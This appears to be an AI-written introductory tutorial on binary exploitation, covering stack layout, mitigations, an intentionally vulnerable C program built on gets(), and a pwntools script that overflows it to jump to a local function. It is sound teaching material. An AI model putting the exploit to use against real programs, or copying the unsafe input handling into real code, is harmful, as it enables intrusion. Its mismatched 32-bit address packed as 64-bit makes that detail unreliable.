Here is your **clean, properly structured Markdown write-up**, polished and formatted consistently:

---

# Introduction to Binary Exploitation

## 📋 Summary

### Core Concept

Binary exploitation is the practice of identifying and leveraging vulnerabilities in compiled programs to manipulate their execution flow. It focuses on how memory is structured (stack and heap) and how improper memory handling can be abused to execute unintended behavior.

### Key Takeaways

* Exploitation commonly results from poor **input validation** or unsafe memory handling.
* Strong understanding of **x86/x64 architecture** and **assembly language** is essential.
* Modern systems use mitigation techniques to prevent or complicate exploitation.

---

## 📖 Definition

**Binary Exploitation** (often called *pwn*) is a cybersecurity discipline that targets vulnerabilities in compiled binaries rather than source code.

Common vulnerability types include:

* Buffer overflows
* Format string vulnerabilities
* Integer overflows
* Use-after-free bugs

---

## 📊 Complexity Considerations

| Notation | Name        | Growth Rate  | Example Scenario                       |
| -------- | ----------- | ------------ | -------------------------------------- |
| O(1)     | Constant    | Stable       | Direct memory access via pointer       |
| O(n)     | Linear      | Proportional | Scanning a buffer for a null byte      |
| O(2ⁿ)    | Exponential | Rapid growth | Brute-forcing a canary or ASLR address |

### Cases

* **Best Case:** Direct instruction pointer (RIP/EIP) overwrite with no protections.
* **Average Case:** Vulnerability + memory leak → calculate base address of `libc`.
* **Worst Case:** Full brute-force of ASLR entropy without information leaks.

---

## ❓ Why Study Binary Exploitation?

1. **Vulnerability Research** – Discover and patch flaws.
2. **Exploit Development** – Build Proof of Concepts (PoCs).
3. **Security Auditing** – Evaluate mitigations like:

   * ASLR (Address Space Layout Randomization)
   * DEP/NX (Data Execution Prevention)
   * Stack Canaries
   * PIE (Position Independent Executables)

---

## ⚙️ How It Works

A typical stack-based exploitation workflow:

### 1️⃣ Identify a Vulnerability

Find unsafe input functions such as:

```c
gets()
scanf("%s", buffer)
strcpy()
```

### 2️⃣ Determine the Offset

Calculate how many bytes are required to overwrite the return address.

Example:

```
Buffer size: 64 bytes
Saved RBP:   8 bytes
------------------------
Offset to RIP = 72 bytes
```

### 3️⃣ Control Execution Flow

Overwrite the return address with:

* Address of another function
* ROP chain
* Shellcode (if executable memory allowed)

---

## 🧠 Stack Memory Model (Simplified)

```
| Return Address |
| Saved RBP      |
| Buffer[64]     |
```

If input length > 64 bytes, data overwrites:

* Saved RBP
* Return Address

This allows control over program execution.

---

## 💻 Practical Example

### Vulnerable Program (`vuln.c`)

```c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("You have successfully redirected execution!\n");
}

void vulnerable_function() {
    char buffer[64];
    printf("Enter some text: ");
    gets(buffer);  // Unsafe
}

int main() {
    vulnerable_function();
    return 0;
}
```

⚠️ `gets()` does not check input size → buffer overflow vulnerability.

---

### Exploit Script (`exploit.py`)

```python
from pwn import *

p = process('./vuln')

# Example address of secret_function
target_addr = p64(0x080484b6)

payload = b"A" * 72 + target_addr

p.sendline(payload)
print(p.recvall().decode())
```

**Explanation (short):**

* `72 bytes` → fill buffer + saved RBP
* `target_addr` → overwrite return address
* Execution jumps to `secret_function()`

---

## 🛡️ Common Mitigations

| Mitigation   | Purpose                               |
| ------------ | ------------------------------------- |
| ASLR         | Randomizes memory addresses           |
| NX / DEP     | Prevents execution of stack memory    |
| Stack Canary | Detects buffer overflow before return |
| PIE          | Randomizes binary base address        |
| RELRO        | Protects GOT from overwriting         |

---

## 📚 References

* 